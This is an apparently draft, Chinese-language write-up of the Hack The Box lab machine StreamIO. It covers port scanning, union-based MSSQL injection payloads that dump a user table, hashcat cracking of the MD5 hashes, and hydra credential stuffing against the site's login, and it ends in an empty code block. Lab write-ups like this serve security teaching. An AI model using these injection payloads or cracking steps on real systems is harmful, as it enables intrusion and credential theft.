---
title: HTB-StreamIO Writeup
date: 2026-03-19T13:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]                                                                                                                                  
└─$ sudo nmap --min-rate 10000 -p- 10.129.6.162 -oA ports                                                                                                               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 02:35 EDT                                                                                                         
Nmap scan report for 10.129.6.162                                                                                                                                       
Host is up (0.17s latency).                                                                                                                                             
Not shown: 65515 filtered tcp ports (no-response)                                                                                                                       
PORT      STATE SERVICE                                                                                                                                                 
53/tcp    open  domain                                                                                                                                                  
80/tcp    open  http                                                                                                                                                    
88/tcp    open  kerberos-sec                                                                                                                                            
135/tcp   open  msrpc                                                                                                                                                   
139/tcp   open  netbios-ssn                                                                                                                                             
389/tcp   open  ldap                                                                                                                                                    
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49704/tcp open  unknown
49731/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds

```

将端口格式化备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ post=$(grep open ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ echo $post 
53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49704,49731
```

### Nmap 默认脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo nmap --script=http-brute -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49704,49731 10.129.6.162 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 02:44 EDT
Nmap scan report for 10.129.6.162
Host is up (0.16s latency).

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
| http-brute:   
|_  Path "/" does not require authentication
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
| http-brute:   
|_  Path "/" does not require authentication
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49704/tcp open  unknown
49731/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49704,49731 10.129.6.162
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 02:43 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 20.00% done; ETC: 02:44 (0:00:24 remaining)
Nmap scan report for 10.129.6.162
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-19 13:43:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_ssl-date: 2026-03-19T13:45:20+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-19T13:44:39
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.90 seconds

```

基于 80 端口 IIS 版本，主机可能运行着 Windoes 10+ 或 Server 2016+。服务 DNS 53、Kerberos 88、LDAP 389 组合表明这可能是一个域控制器。443 的 TLS 证书上有两个 DNS 名称，添加进 `hosts` 中。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo vim /etc/hosts                                  
                                                                                                 
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ tail -n 1 /etc/hosts
10.129.6.162 watch.streamIO.htb streamIO.htb
```

## SMB 服务渗透

提供一个自定义的用户给 smbmap 尝试扫描，访问被拒绝，无有价值的信息暴露。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ smbmap -H streamIO.htb -u enil

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (10.129.6.162) Error occurs while reading from remote(104) on line 1015                      
[*] Closed 1 connections
```

使用 smbclient 进行匿名访问同样拒绝。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ smbclient -L //10.129.6.162 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

使用 crackmapexec 尝试枚举 smb，

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ crackmapexec smb 10.129.6.162
SMB         10.129.6.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```

- 445 端口开放，SMB 服务正常运行
- 机器名为 DC，即 Domain Controller（域控制器）
- 域名为 streamIO.htb
- 靶机运行的系统版本为 Windows 10 / Server 2019
- SMB 签名已启用，防止中间人攻击
- SMBv1 已关闭

## Web 渗透

访问` http://streamio.htb`，无有价值的发现。

![](Pasted%20image%2020260319152602.png)

执行 gobuster 目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo gobuster dir -u http://streamio.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt                                                                        
[sudo] password for kali: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
Progress: 7831 / 207644 (3.77%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 7831 / 207644 (3.77%)
===============================================================
Finished
===============================================================
```

无有价值的信息发现。

访问 `http://streamio.htb`。

![](Pasted%20image%2020260319153008.png)

`Home` 页面可以进行注册登入操作。

![](Pasted%20image%2020260319154053.png)

创建一个新用户

![](Pasted%20image%2020260321144652.png)

使用创建的新用户进行登入，但是登入失败了。

![](Pasted%20image%2020260321144702.png)

进一步进行目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo gobuster dir -u https://streamio.htb/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md -k                             
[sudo] password for kali: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,php.bak,tar,tar.gz,git,js,md,jsp,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 13497]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/contact.php          (Status: 200) [Size: 6434]
/about.php            (Status: 200) [Size: 7825]
/login.php            (Status: 200) [Size: 4145]
/register.php         (Status: 200) [Size: 4500]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/Contact.php          (Status: 200) [Size: 6434]
/About.php            (Status: 200) [Size: 7825]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
Progress: 27701 / 2646732 (1.05%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 27713 / 2646732 (1.05%)
===============================================================
Finished
===============================================================
```

未发现更多有价值的目录。

### SQL 注入

访问先前发现的 `https://watch.streamio.htb`，是一个电影管理系统。

![](Pasted%20image%2020260319153446.png)

尝试进行 sql 注入，执行语句 `' or 1=1 -- -` 发现跳转到 `blocked.php` 界面，提示访问被拒绝。

![](Pasted%20image%2020260321144918.png)

搜索一个页面电影中存在的关键词 `12`，返回所有包含该关键词的电影。

![](Pasted%20image%2020260321145017.png)

MSSQL（Microsoft SQL Server）是微软的产品，专为 Windows 设计，Windows Server + AD 域数据库首选 MSSQL，推测 sql 查询应该存在模糊查询，可能为 

`select * from movie where film like '%[input]%'`

进一步注入语句 `e' and 1=1 -- -`，这个语句使得 sql 查询变为 `selcet * from movie where film like '%e' and 1=1 -- -%'`，查询出所有带有 `e` 的电影。

![](Pasted%20image%2020260321160059.png)

尝试注入语句 `e' orderby 1 -- -` 猜测列数。

![](Pasted%20image%2020260321160139.png)

逐个测试直至语句 `enil' union select 1,2,3,4,5,6 -- -` 测试出列数为 6，回显位置为 2、3。

![](Pasted%20image%2020260321160342.png)

使用 `enil' union select 1,@@version,3,4,5,6 -- -` 查询数据库的版本。为 Microsoft SQL Server 2019。

![](Pasted%20image%2020260324162747.png)

执行 `enil' union select 1,name,3,4,5,6 from master..sysdatabases -- -` 查询 `master` 数据库中的 `sysdatabases` 表中的数据。

![](Pasted%20image%2020260324163045.png)

当前数据库应该为 `STREAMIO`。

执行 `enil' union select 1,(select DB_NAME()),3,4,5,6 from master..sysdatabases -- -` 查询当前正在使用的数据库名称为 `STREAMIO`。

![](Pasted%20image%2020260324163144.png)

执行 `enil' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U' -- -` 查找 id 与 name。

`sysobjects` 是一个系统表，包含了有关数据库中的对象（例如表、视图、储存过程）的元数据信息。在这个查询中，`xtype` 是 `sysobjects` 表中的一个列，表示对象类型。`where xtype="U"` 是一个条件，限制了结果集中只返回对象类型为 “U” （User Table）的行。这个条件过滤了只有用户表的信息被检索出来，其他类型的对象被排除。

![](Pasted%20image%2020260324163327.png)

执行 `enil' union select 1,name,id,4,5,6 from streamio..syscolumns where id in  (885578193,901578250) -- -` 获取字段名。

![](Pasted%20image%2020260324163439.png)

执行 `enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -` 获取 username 与 password。

![](Pasted%20image%2020260324163639.png)

![](Pasted%20image%2020260324163652.png)

使用 curl 提取有效字段。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ curl -X POST 'https://watch.streamio.htb/search.php' -d "q=enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -" -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g' | tr -d " \t" | tee hash.lst                                                                                  
admin:665a50ac9eaa781e4f7f04199db97a11                                                                                                                                                                                                                                                                                      
Alexendra:1c2b3d8270321140e5153f6637d3ee53                                     
Austin:0049ac57646627b8d7aeaccf8b6a936f                                        
Barbra:3961548825e3e21df5646cafe11c6c76                                        
Barry:54c88b2dbd7b1a84012fabc1a4c73415                                         
Baxter:22ee218331afd081b0dcd8115284bae3                                        
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8                                         
Carmon:35394484d89fcfdb3c5e447fe749d213                                        
Clara:ef8f3d30a856cf166fb8215aca93e9ff                                         
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5                                        
Garfield:8097cedd612cc37c29db152b6e9edbd3                                      
Gloria:0cfaaaafb559f081df2befbe66686de0                                        
James:c660060492d9edcaa8332d89c99c9239                                         
Juliette:6dcd87740abb64edfa36d170f0d5450d                                      
Lauren:08344b85b329d7efd611b7a7743e8a09                                        
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f                                        
Lucifer:7df45a9e3de3863807c026ba48e55fb3                                       
Michelle:b83439b16f844bd6ffe35c02fe21b3c0                                      
Oliver:fd78db29173a5cf701bd69027cb9bf6b                                        
Robert:f03b910e2bd0313a23fdd7575f34a694                                        
Robin:dc332fb5576e9631c9dae83f194f8e70                                         
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5                                       
Samantha:083ffae904143c4796e464dac33c1f7d                                      
Stan:384463526d288edcc95fc3701e523bc7                                          
Thane:3577c47eb1e12c8ba021611e1280753c                                         
Theodore:925e5408ecb67aea449373d668b7359e                                      
Victor:bf55e15b119860a6e6b5a164377da719                                        
Victoria:b22abb47a02b52d5dfa27fb0b534f693                                      
William:d62be0dc82071bccc1322d64ec5b6c51                                       
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332                                     
                                                                               
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]                                         
└─$ cat hash.lst                                                                                                                                                                                                                                                                                                            
admin:665a50ac9eaa781e4f7f04199db97a11                                         
Alexendra:1c2b3d8270321140e5153f6637d3ee53                                     
Austin:0049ac57646627b8d7aeaccf8b6a936f                                        
Barbra:3961548825e3e21df5646cafe11c6c76                                        
Barry:54c88b2dbd7b1a84012fabc1a4c73415                                         
Baxter:22ee218331afd081b0dcd8115284bae3                                        
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8                                         
Carmon:35394484d89fcfdb3c5e447fe749d213                                        
Clara:ef8f3d30a856cf166fb8215aca93e9ff                                         
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5                                        
Garfield:8097cedd612cc37c29db152b6e9edbd3                                      
Gloria:0cfaaaafb559f081df2befbe66686de0                                        
James:c660060492d9edcaa8332d89c99c9239                                         
Juliette:6dcd87740abb64edfa36d170f0d5450d                                      
Lauren:08344b85b329d7efd611b7a7743e8a09                                        
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f                                        
Lucifer:7df45a9e3de3863807c026ba48e55fb3                                       
Michelle:b83439b16f844bd6ffe35c02fe21b3c0                                      
Oliver:fd78db29173a5cf701bd69027cb9bf6b                                        
Robert:f03b910e2bd0313a23fdd7575f34a694                                        
Robin:dc332fb5576e9631c9dae83f194f8e70                                         
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5                                       
Samantha:083ffae904143c4796e464dac33c1f7d                                      
Stan:384463526d288edcc95fc3701e523bc7                                          
Thane:3577c47eb1e12c8ba021611e1280753c                                         
Theodore:925e5408ecb67aea449373d668b7359e                                      
Victor:bf55e15b119860a6e6b5a164377da719                                        
Victoria:b22abb47a02b52d5dfa27fb0b534f693                                      
William:d62be0dc82071bccc1322d64ec5b6c51                                       
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332 
```

### Hashcat 暴力破解

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo hashcat --user -m 0 hash.lst /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 30 digests; 30 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.lst
Time.Started.....: Tue Mar 24 04:55:10 2026 (2 secs)
Time.Estimated...: Tue Mar 24 04:55:12 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7686.0 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 12/30 (40.00%) Digests (total), 12/30 (40.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util:  0%

Started: Tue Mar 24 04:55:09 2026
Stopped: Tue Mar 24 04:55:14 2026

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat hash.lst           
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat pass.lst                           
3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat hash.lst| cut -d: -f1 > users
                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat pass.lst | cut -d: -f2 > pass
                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat users                        
admin
Alexendra
Austin
Barbra
Barry
Baxter
Bruno
Carmon
Clara
Diablo
Garfield
Gloria
James
Juliette
Lauren
Lenord
Lucifer
Michelle
Oliver
Robert
Robin
Sabrina
Samantha
Stan
Thane
Theodore
Victor
Victoria
William
yoshihide

┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat pass                         
highschoolmusical        
physics69i               
paddpadd                 
66boysandgirls..         
%$clara                  
$monique$1991$           
$hadoW                   
$3xybitch                
##123a8j8w5123##         
!5psycho8!               
!?Love?!123              
!!sabrina$

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ crackmapexec smb streamio.htb -u user -p pass --no-bruteforce --continue-on-success
SMB         watch.streamIO.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:highschoolmusical STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:physics69i STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:paddpadd STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:66boysandgirls.. STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:%$clara STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$monique$1991$ STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$hadoW STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$3xybitch STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:##123a8j8w5123## STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!5psycho8! STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!?Love?!123 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!!sabrina$ STATUS_LOGON_FAILURE 
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo hashcat --user -m 0 hash.lst /usr/share/wordlists/rockyou.txt --show | tee user-pass                     
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat user-pass 
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat user-pass | cut -d: -f1,3 | tee userspass
admin:paddpadd
Barry:$hadoW
Bruno:$monique$1991$
Clara:%$clara
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ hydra -C userspass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 10:39:17
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 10:39:20
```

![](Pasted%20image%2020260324225127.png)

![](Pasted%20image%2020260324225314.png)

![](Pasted%20image%2020260324225325.png)

```bash
